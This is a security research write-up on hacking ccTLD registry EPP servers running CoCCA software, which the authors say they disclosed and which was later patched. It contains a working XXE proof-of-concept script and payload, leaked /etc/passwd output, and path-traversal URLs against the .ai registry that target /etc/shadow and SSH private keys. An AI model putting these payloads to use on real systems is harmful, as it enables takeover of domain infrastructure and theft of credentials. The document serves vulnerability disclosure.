---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-06-12_can-i-speak-to-your-manager-hacking-root-epp-servers-to-take-control-of-zones.md
original_filename: 2023-06-12_can-i-speak-to-your-manager-hacking-root-epp-servers-to-take-control-of-zones.md
title: can I speak to your manager? hacking root EPP servers to take control of zones
category: documents
detected_topics:
- command-injection
- path-traversal
- graphql
- mobile-security
tags:
- imported
- documents
- command-injection
- path-traversal
- graphql
- mobile-security
language: en
raw_sha256: 8735c516ae86727906126e3615b356d8455c62bffbde683a0f980bcea374e936
text_sha256: 7204436460c6197b6b615830cd9033a5d1d21895fb7be9a0e91cf675726775b6
ingested_at: '2026-06-28T07:32:22Z'
sensitivity: unknown
redactions_applied: true
---

# can I speak to your manager? hacking root EPP servers to take control of zones

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-06-12_can-i-speak-to-your-manager-hacking-root-epp-servers-to-take-control-of-zones.md
- Source Type: markdown
- Detected Topics: command-injection, path-traversal, graphql, mobile-security
- Ingested At: 2026-06-28T07:32:22Z
- Redactions Applied: True
- Raw SHA256: `8735c516ae86727906126e3615b356d8455c62bffbde683a0f980bcea374e936`
- Text SHA256: `7204436460c6197b6b615830cd9033a5d1d21895fb7be9a0e91cf675726775b6`


## Content

---
title: "can I speak to your manager? hacking root EPP servers to take control of zones"
url: "https://hackcompute.com/hacking-epp-servers/"
final_url: "https://hackcompute.com/hacking-epp-servers/"
authors: ["Sam Curry (@samwcyo)", "Brett Buerhaus (@bbuerhaus)", "Rhys Elsmore (@rhyselsmore)", "Shubham Shah (@infosec_au)"]
programs: ["CoCCA"]
bugs: ["XXE", "LFI", "EPP protocol"]
publication_date: "2023-06-12"
added_date: "2023-06-13"
source: "pentester.land/writeups.json"
original_index: 1059
---

12 Jun 2023  12 min read  [writeups](/tag/writeups/)

# can I speak to your manager? hacking root EPP servers to take control of zones

Finding vulnerabilities in global domain infrastructure to take control of ccTLD zones. Vulnerabilities in EPP 

Share 

[hackcompute group](/author/hackcompute/)

Over the last few decades, the internet has been built upon specifications and protocols that often get forgotten about over time. Our research has often been focused on high impact targets (such as [Web Hackers vs. The Auto Industry](https://samcurry.net/web-hackers-vs-the-auto-industry/?ref=hackcompute.com)) and for the last few weeks, we decided to investigate the security of ccTLD/TLD registries around the world.

Our efforts in this space led to the ability to control the DNS zones of the following ccTLDs: .ai, .bj, .bw, .ci, .gl, .ke, .kn, .lb, .ly, .mr, .ms, .mz, .ng, .py, .rw, .so, .ss, .td, .zm.

This body of work was done by [Sam Curry](https://twitter.com/samwcyo?ref=hackcompute.com), [Brett Buerhaus](https://twitter.com/bbuerhaus?ref=hackcompute.com), [Rhys Elsmore](https://twitter.com/rhyselsmore?ref=hackcompute.com), and [Shubham Shah](https://twitter.com/infosec_au?ref=hackcompute.com).
  
  
  ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
  "What's a registry, registrar and EPP server?"
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

When we speak about registries, we are referring to the highest level of the chain. The registries are responsible for managing every domain registered within their zone and facilitate important functionalities for the registrars that speak to them.

Through hacking a registry, we ultimately gain control over every domain within their zone, regardless of which registrar was responsible for registering the domain.

The registrar is the middle man between the consumer and the registry. When you purchase a domain from a registrar, they speak with the registry and register the domain you have purchased.

EPP (Extensible Provision Protocol) defines a unified way for how registrars can communicate with registries of domain names by exchanging XML messages.

EPP is typically implemented as an API between the registrar’s web interface and the Registry. Such integration allows the registrar to react immediately to requests from its clients and know for sure if the action succeeded or not. Should some action, such as registration of a domain name, to be put off until later, the registry will notify the registrar with the service message.

EPP servers are arguably one of the most critical pieces of infrastructure in the world of domains.

From this context, you can understand that a critical vulnerability that affects a registry or their EPP server, is basically game over.

Gaining control over an entire root zone is not necessarily a new concept, however, historically, it has been executed through misconfigurations in DNS. [[1]](https://labs.detectify.com/2021/01/15/how-i-hijacked-the-top-level-domain-of-a-sovereign-state/?ref=hackcompute.com) [[2]](https://thehackerblog.com/the-journey-to-hijacking-a-countrys-tld-the-hidden-risks-of-domain-extensions/?ref=hackcompute.com) [[3]](https://thehackerblog.com/the-io-error-taking-control-of-all-io-domains-with-a-targeted-registration/?ref=hackcompute.com)

While taking over ccTLD's over DNS misconfigurations are cool, our focus was to take over entire zones through vulnerabilities that affect the underlying protocols and web applications that run registries on the internet. 
  
  
  ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
  "Understanding the EPP protocol"
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

EPP is quite simple actually. It runs on port `700` typically and all communication to the EPP server is done through XML over SSL/TLS. Registries are required to implement an EPP server so that registrars can speak to them and vice versa.

While the protocol is quite simple, many registries make an effort to secure access to their EPP servers through the enforcement of mutual TLS or requiring certain certificates in your CA chain to be able to communicate with them. The 'mutual' in mutual TLS is not the same as client-side certificates.

An example EPP message looks like the one below
  
  
  <?xml version="1.0" encoding="UTF-8" standalone="no"?>
  <epp xmlns="urn:ietf:params:xml:ns:epp-1.0"><hello/></epp>

The EPP protocol is vast, but almost all functionality is only unlocked after authenticating to the EPP server. This whole protocol gets easier to understand once you put yourselves in the shoes of a domain reseller that needs to perform administrative actions on domains that they own.

They are able to connect to the registry EPP server, authenticate to it, and then make the relevant actions for domains they own (i.e. DNS transfer codes, updating WHOIS records). They should only be able to operate on the domains that are within their control.

As per Wikipedia, the protocol has been adopted by a number of ccTLD domain name registries, such as: [.ac](https://en.wikipedia.org/wiki/.ac?ref=hackcompute.com), [.ag](https://en.wikipedia.org/wiki/.ag?ref=hackcompute.com), [.ai](https://en.wikipedia.org/wiki/.ai?ref=hackcompute.com), [.as](https://en.wikipedia.org/wiki/.as?ref=hackcompute.com), [.ar](https://en.wikipedia.org/wiki/.ar?ref=hackcompute.com), [.at](https://en.wikipedia.org/wiki/.at?ref=hackcompute.com), [.au](https://en.wikipedia.org/wiki/.au?ref=hackcompute.com), [.be](https://en.wikipedia.org/wiki/.be?ref=hackcompute.com), [.br](https://en.wikipedia.org/wiki/.br?ref=hackcompute.com), [.bz](https://en.wikipedia.org/wiki/.bz?ref=hackcompute.com), [.ca](https://en.wikipedia.org/wiki/.ca?ref=hackcompute.com), [.cat](https://en.wikipedia.org/wiki/.cat?ref=hackcompute.com), [.cc](https://en.wikipedia.org/wiki/.cc?ref=hackcompute.com), [.ch](https://en.wikipedia.org/wiki/.ch?ref=hackcompute.com), [.cl](https://en.wikipedia.org/wiki/.cl?ref=hackcompute.com), [.cn](https://en.wikipedia.org/wiki/.cn?ref=hackcompute.com), [.co](https://en.wikipedia.org/wiki/.co?ref=hackcompute.com), [.cr](https://en.wikipedia.org/wiki/.cr?ref=hackcompute.com), [.cx](https://en.wikipedia.org/wiki/.cx?ref=hackcompute.com), [.cz](https://en.wikipedia.org/wiki/.cz?ref=hackcompute.com), [.dk](https://en.wikipedia.org/wiki/.dk?ref=hackcompute.com), [.dm](https://en.wikipedia.org/wiki/.dm?ref=hackcompute.com), [.ee](https://en.wikipedia.org/wiki/.ee?ref=hackcompute.com), [.es](https://en.wikipedia.org/wiki/.es?ref=hackcompute.com) (over HTTPS), [.eu](https://en.wikipedia.org/wiki/.eu?ref=hackcompute.com), [.fi](https://en.wikipedia.org/wiki/.fi?ref=hackcompute.com), [.fm](https://en.wikipedia.org/wiki/.fm?ref=hackcompute.com), [.fr](https://en.wikipedia.org/wiki/.fr?ref=hackcompute.com), [.gg](https://en.wikipedia.org/wiki/.gg?ref=hackcompute.com), [.gr](https://en.wikipedia.org/wiki/.gr?ref=hackcompute.com) (over HTTPS), [.gs](https://en.wikipedia.org/wiki/.gs?ref=hackcompute.com), [.hn](https://en.wikipedia.org/wiki/.hn?ref=hackcompute.com), [.ht](https://en.wikipedia.org/wiki/.ht?ref=hackcompute.com), [.il](https://en.wikipedia.org/wiki/.il?ref=hackcompute.com), [.im](https://en.wikipedia.org/wiki/.im?ref=hackcompute.com), [.in](https://en.wikipedia.org/wiki/.in?ref=hackcompute.com), [.io](https://en.wikipedia.org/wiki/.io?ref=hackcompute.com), [.it](https://en.wikipedia.org/wiki/.it?ref=hackcompute.com) (over HTTPS), [.je](https://en.wikipedia.org/wiki/.je?ref=hackcompute.com), [.ke](https://en.wikipedia.org/wiki/.ke?ref=hackcompute.com), [.ki](https://en.wikipedia.org/wiki/.ki?ref=hackcompute.com), [.ky](https://en.wikipedia.org/wiki/.ky?ref=hackcompute.com), [.kz](https://en.wikipedia.org/wiki/.kz?ref=hackcompute.com), [.la](https://en.wikipedia.org/wiki/.la?ref=hackcompute.com), [.lc](https://en.wikipedia.org/wiki/.lc?ref=hackcompute.com), [.li](https://en.wikipedia.org/wiki/.li?ref=hackcompute.com), [.lt](https://en.wikipedia.org/wiki/.lt?ref=hackcompute.com), [.lu](https://en.wikipedia.org/wiki/.lu?ref=hackcompute.com), [.lv](https://en.wikipedia.org/wiki/.lv?ref=hackcompute.com), [.md](https://en.wikipedia.org/wiki/.md?ref=hackcompute.com), [.me](https://en.wikipedia.org/wiki/.me?ref=hackcompute.com), [.mk](https://en.wikipedia.org/wiki/.mk?ref=hackcompute.com), [.mn](https://en.wikipedia.org/wiki/.mn?ref=hackcompute.com), [.ms](https://en.wikipedia.org/wiki/.ms?ref=hackcompute.com), [.mu](https://en.wikipedia.org/wiki/.mu?ref=hackcompute.com), [.mx](https://en.wikipedia.org/wiki/.mx?ref=hackcompute.com), [.na](https://en.wikipedia.org/wiki/.na?ref=hackcompute.com), [.nf](https://en.wikipedia.org/wiki/.nf?ref=hackcompute.com), [.ng](https://en.wikipedia.org/wiki/.ng?ref=hackcompute.com), [.nl](https://en.wikipedia.org/wiki/.nl?ref=hackcompute.com), [.no](https://en.wikipedia.org/wiki/.no?ref=hackcompute.com), [.nu](https://en.wikipedia.org/wiki/.nu?ref=hackcompute.com), [.nz](https://en.wikipedia.org/wiki/.nz?ref=hackcompute.com) (EPP codes referred to as [UDAIs](https://en.wikipedia.org/wiki/Unique_Domain_Authentication_Identifier?ref=hackcompute.com)), [.pe](https://en.wikipedia.org/wiki/.pe?ref=hackcompute.com), [.pk](https://en.wikipedia.org/wiki/.pk?ref=hackcompute.com), [.pl](https://en.wikipedia.org/wiki/.pl?ref=hackcompute.com) (over HTTPS), [.ps](https://en.wikipedia.org/wiki/.ps?ref=hackcompute.com), [.pt](https://en.wikipedia.org/wiki/.pt?ref=hackcompute.com), [.ru](https://en.wikipedia.org/wiki/.ru?ref=hackcompute.com), [.ro](https://en.wikipedia.org/wiki/.ro?ref=hackcompute.com), [.sc](https://en.wikipedia.org/wiki/.sc?ref=hackcompute.com), [.se](https://en.wikipedia.org/wiki/.se?ref=hackcompute.com), [.sh](https://en.wikipedia.org/wiki/.sh?ref=hackcompute.com), [.si](https://en.wikipedia.org/wiki/.si?ref=hackcompute.com), [.su](https://en.wikipedia.org/wiki/.su?ref=hackcompute.com), [.tl](https://en.wikipedia.org/wiki/.tl?ref=hackcompute.com), [.tm](https://en.wikipedia.org/wiki/.tm?ref=hackcompute.com) [.tv](https://en.wikipedia.org/wiki/.tv?ref=hackcompute.com), [.tw](https://en.wikipedia.org/wiki/.tw?ref=hackcompute.com), [.ua](https://en.wikipedia.org/wiki/.ua?ref=hackcompute.com), [.uk](https://en.wikipedia.org/wiki/.uk?ref=hackcompute.com), [.us](https://en.wikipedia.org/wiki/.us?ref=hackcompute.com), [.vc](https://en.wikipedia.org/wiki/.vc?ref=hackcompute.com), [.ve](https://en.wikipedia.org/wiki/.ve?ref=hackcompute.com) and [.za](https://en.wikipedia.org/wiki/.za?ref=hackcompute.com) as well as [ENUM](https://en.wikipedia.org/wiki/ENUM?ref=hackcompute.com) registries such as those operating the +31, +41, +43, +44 and +48 country codes.[[9]](https://en.wikipedia.org/wiki/Extensible_Provisioning_Protocol?ref=hackcompute.com#cite_note-9)
  
  
  ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
  "Attacking the EPP protocol"
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

When hacking any system, you cannot make assumptions on its security posture as you will risk not testing certain vulnerability classes. Coming from the web application security angle, our immediate thoughts for targeting this protocol was testing for the presence of [XML external entity injection](https://portswigger.net/web-security/xxe?ref=hackcompute.com).

In order to do this, we modified a Python EPP client and crafted an XML payload in the correct format. This XML payload contained our XXE attack at the top. From scanning the internet and relying on passive data for IPs with port 700 open, we were able to amass a large list of EPP servers to attempt our research on.

Our proof-of-concept was extremely effective:
  
  
  from epp import epp_client
  import sys
  
  ip = sys.argv[1]
  try:
  conn = epp_client.EPPConnection(
  host=ip,
  port=700,
  user='epp_user_01',
  password=***REDACTED***,
  verbose=True,
  return_soup=True,
  )
  conn.open()
  print(conn.call("<?xml version=\"1.0\" standalone=\"no\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> <epp xmlns=\"urn:ietf:params:xml:ns:epp-1.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"urn:ietf:params:xml:ns:epp-1.0 epp-1.0.xsd\"> <command> <poll op='req' /> <clTRID>&xxe;</clTRID> </command> </epp>".format(ip)))
  except:
  print('failed lol')

Running this on a vulnerable server yielded the following:
  
  
  <?xml version="1.0" encoding="UTF-8" standalone="no"?><html><body><epp xmlns="urn:ietf:params:xml:ns:epp-1.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemalocation="urn:ietf:params:xml:ns:epp-1.0 epp-1.0.xsd"><response><result code="2001"><msg>Command syntax error</msg><extvalue><value xmlns:epp="urn:ietf:params:xml:ns:epp-1.0"><epp:undef></epp:undef></value><reason>XML Parser: unknown-55ccdac19830:0: Schemas validity error : Element '{urn:ietf:params:xml:ns:epp-1.0}clTRID': [facet 'maxLength'] The value has a length of '1845'; this exceeds the allowed maximum length of '64'.
  unknown-55ccdac19830:0: Schemas validity error : Element '{urn:ietf:params:xml:ns:epp-1.0}clTRID': 'root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
  systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
  syslog:x:102:106::/home/syslog:/usr/sbin/nologin
  messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
  _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
  sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
  sysadm:x:1000:1000:Unprivileged Administrator Account,,,:/home/sysadm:/bin/bash
  ansible:x:1001:1001:ansible user:/home/ansible:/bin/bash
  sssd:x:106:112:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
  bareos:x:107:113:bareos,,,:/var/lib/bareos:/usr/sbin/nologin
  nagios:x:108:114::/var/lib/nagios:/usr/sbin/nologin
  stunnel4:x:109:115::/var/run/stunnel4:/usr/sbin/nologin
  ntp:x:110:116::/nonexistent:/usr/sbin/nologin
  _lldpd:x:111:117::/var/run/lldpd:/usr/sbin/nologin
  postfix:x:112:119::/var/spool/postfix:/usr/sbin/nologin
  ' is not a valid value of the atomic type '{urn:ietf:params:xml:ns:epp-1.0}trIDStringType'.
  </reason></extvalue></result><trid><svtrid>RO-549-1682827377068386</svtrid></trid></response></epp>

Surprisingly, we saw a large number of EPP servers vulnerable to this simple XXE attack. We received over 50 callbacks to our Burp Collaborator server, and in the process of investigating these, we started to see a pattern. Most of the EPP servers that were vulnerable to this were running a registry software named [CoCCA Registry Software](https://cocca.org.nz/srs/?ref=hackcompute.com).

This software allows registries to bootstrap their operations and provides all the functionalities needed for them to operate a TLD/ccTLD. This software has been instrumental in the proliferation of smaller ccTLDs as they often do not have the resources to build all of these functionalities themselves.

Often, ccTLDs are managed by small teams and sometimes this work is outsourced to Universities or private individuals. We sometimes do not recognize the sparseness of resources when it comes to our global internet infrastructure. 
  
  
  ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
  "Exploring the CoCCA Registry Software"
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

The registry software includes a web application that is used to manage the registry, as well as an in-built EPP server where we discovered our XXE in. This application is written purely in Java, backed by a Postgres database.

We were quickly able to identify the root cause of the XXE when looking at the `EppConnection.java` class, which initialised an XML reader through the following code:
  
  
  /*  */  public EppConnection() {
  /*  */  try {
  /* 106 */  DocumentBuilderFactory dFactory = DocumentBuilderFactory.newInstance();
  /* 107 */  dFactory.setNamespaceAware(true);
  /* 108 */  dFactory.setIgnoringElementContentWhitespace(true);
  /* 109 */  this.dBuilder = dFactory.newDocumentBuilder();
  /*  */  
  /* 111 */  TransformerFactory tFactory = TransformerFactory.newInstance();
  /* 112 */  this.transformer = tFactory.newTransformer();
  /* 113 */  this.transformer.setOutputProperty("encoding", "UTF-8");
  /* 114 */  } catch (ParserConfigurationException e) {
  /* 115 */  e.printStackTrace(System.out);
  /* 116 */  } catch (TransformerConfigurationException e) {
  /* 117 */  e.printStackTrace(System.out);
  /*  */  } 
  /*  */  }

As you can see above, the document builder factory that is used for all XML processing has not been set up to ignore external entities or DTDs. Due to this, any XML processing done by the in-built EPP server was vulnerable to XXE.

The below XXE payload will successfully fire when the EPP server processes our XML:
  
  
  <?xml version="1.0" standalone="no"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <epp xmlns="urn:ietf:params:xml:ns:epp-1.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="urn:ietf:params:xml:ns:epp-1.0 epp-1.0.xsd"> <command> <poll op='req' /> <clTRID>&xxe;</clTRID> </command> </epp>

This example was also utilized in our simple checker script above in this blog post, and the SYSTEM entity can be changed to a Burp Collaborator URL to capture out of bound hits.

While the XXE was an impactful finding, we became curious about the security posture of this registry software as it is used so heavily to operate a significant portion of the internet as we know it.

Checking the `web.xml` file, we started mapping out pre-authentication routes until we came across the following servlet definition:
  
  
  <!-- Cities servlet for contact create -->
  <servlet>
  <servlet-name>CitiesServlet</servlet-name>
  <servlet-class>cx.cocca.utils.CitiesServlet
  </servlet-class>
  </servlet>
  <servlet-mapping>
  <url-pattern>/cities</url-pattern>
  <servlet-name>CitiesServlet</servlet-name>
  </servlet-mapping>

The code for this servlet contained a local file disclosure vulnerability:
  
  
  public class CitiesServlet extends HttpServlet {
  private static final Log log = LogFactoryImpl.getLog(cx.cocca.utils.CitiesServlet.class);
  
  private static final String FILE = "/cities/cities_";
  
  protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
  String country = req.getParameter("country");
  String fileName = "/cities/cities_" + country;
  log.debug("File name is " + fileName);
  try (InputStream is = getClass().getResourceAsStream(fileName)) {
  StringBuilder sb = new StringBuilder("{\"cities\": [");
  if (is != null) {
  List<String> cities = IOUtils.readLines(is, "UTF-8");
  boolean first = true;
  for (String city : cities) {
  if (!first)
  sb.append(", "); 
  sb.append("\"");
  sb.append(city);
  sb.append("\"");
  first = false;
  } 
  } 
  sb.append("]}");
  resp.setContentType("application/json");
  resp.getWriter().println(sb.toString());
  } catch (Exception e) {
  log.error("Error loading cities", e);
  } 
  }
  }

![](https://hackcompute.com/content/images/2023/05/image.png)

We were able to chain the XXE vulnerability with this local file disclosure vulnerability to obtain any file on the local system. 

The XXE provided us the ability to understand the file and folder structure of the underlying system and this local file disclosure vulnerability let us easily and cleanly download any file on the system. 

The XXE can also be used to exfiltrate files, and through the [FTP trick](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb?ref=hackcompute.com), it is possible to obtain files that contain new lines or control characters.

Given that we could access the `/etc/shadow` file on most servers running this software, it was clear to us that we could access any file on the filesystem, and the application was probably running as root (!!). 
  
  
  ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
  "Proving Impact"
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

Now that we've established the ground work to be able to compromise servers running the CoCCA registry software, how much damage could an attacker really do?

For the purposes of proving the impact, and given the rise of AI, we focused our efforts on the `.AI` ccTLD. The following files were able to be obtained through the vulnerabilities we discovered:
  
  
  https://epp.whois.ai/cities?country=/../../../../../../../../etc/shadow
  https://epp.whois.ai/cities?country=/../../../../../../../../home/vince/.ssh/known_hosts
  https://epp.whois.ai/cities?country=/../../../../../../../../opt/resin/log/oteaccess.log
  https://epp.whois.ai/cities?country=/../../../../../../../../home/garth_cocca/.bash_history
  https://epp.whois.ai/cities?country=/../../../../../../../../opt/resin/conf/resin.xml
  https://epp.whois.ai/cities?country=/../../../../../../../../root/.psql_history
  https://epp.whois.ai/cities?country=/../../../../../../../../home/vince/.ssh/id_rsa

We discovered that one of the maintainers of the `.AI` registry is a person named Vince. Given that the files obtained via this vulnerability gave us his SSH private key, we validated that we could login to his server, which contained several GPG encrypted backups of the entire .AI registry.

We got in touch with Vince, and he thankfully put us in touch with the relevant people as well as acted diligently in resolving the vulnerabilities on his systems. Temporarily taking them offline while a fix was made available.

Speaking with Vince (the administrator of the .ai zone) over WhatsApp, we confirmed that compromising this server would give us full control over any .ai domain:

![](https://hackcompute.com/content/images/2023/05/image-4.png)

The impact unfortunately does not stop there, in the process of reading files from various registry servers running CoCCA, we discovered a file called [`upload-files-box-com.sh`](https://registry.nic.shia/cities?country=/../../../../../../../../root/upload-files-box-com.sh&ref=hackcompute.com).

As the filename suggests, this script was responsible for taking a full database backup and uploading them to a central box.com account. We validated that these credentials were valid and led to the ability to compromise almost every major ccTLD that was running the CoCCA application:

![](https://hackcompute.com/content/images/2023/05/image-1.png)Oh no....

These database backups are essentially game over. Once administrative access is gained to the CoCCA application, it is possible to control the nameservers for every domain for that ccTLD. Additional impact included the ability to transfer domains that don't belong to you.

All of this was communicated to the affected parties and all of the EPP servers running the CoCCA software that were managed by this central entity have been patched. Whether or not they are still uploading all the database backups to a central box.com account is unknown, but it is clear that the internet is so, so brittle.

The latest version of the CoCCA software contains patches for all of the vulnerabilities we discovered.
  
  
  ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
  "Future Work"
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

While we looked at CoCCA in detail, there are two other major registry software that we are aware of where the source code has been made available.

[Nomulus](https://github.com/google/nomulus?ref=hackcompute.com), registry software created and used by Google. You can find this software in production, here: [domain-registry.appspot.com](https://domain-registry.appspot.com/?ref=hackcompute.com)

Fortunately, [Google's defensive programming](https://github.com/google/nomulus/blob/79ba1b94c4102ccb2ae25f48c6961365cb426ac6/core/src/main/java/google/registry/xml/XmlTransformer.java?ref=hackcompute.com#L113), prevented them from being vulnerable to XXE via EPP messages:
  
  
  private static XMLInputFactory createInputFactory() throws FactoryConfigurationError {
  // Prevent XXE attacks.
  XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();
  xmlInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
  xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
  return xmlInputFactory;
  }
  

We spent a significant amount of time on Google's registry software and discovered an endpoint that we believe are not supposed to be accessed without authentication, but given that we couldn't prove much security impact, it was not reported to Google.

Another registry software that could be a great research target is [Fred](https://fred.nic.cz/documentation/html/Architecture/Deployment.html?ref=hackcompute.com#web-node), which is managed by the team at nic.cz. It is being used by a lot of different registries, and any pre-authentication vulnerability in this could be critical to the domain infrastructure for the following ccTLDs:

![](https://hackcompute.com/content/images/2023/05/image-2.png)
  
  
  ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
  "Closing Notes"
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

We thank the CoCCA team for fixing all the issues we identified, Vince from nic.ai, and Mike Damm from Zuffix Domains.

[ ](/foreword/)

### Published by:

[ ](/author/hackcompute/ "hackcompute group")
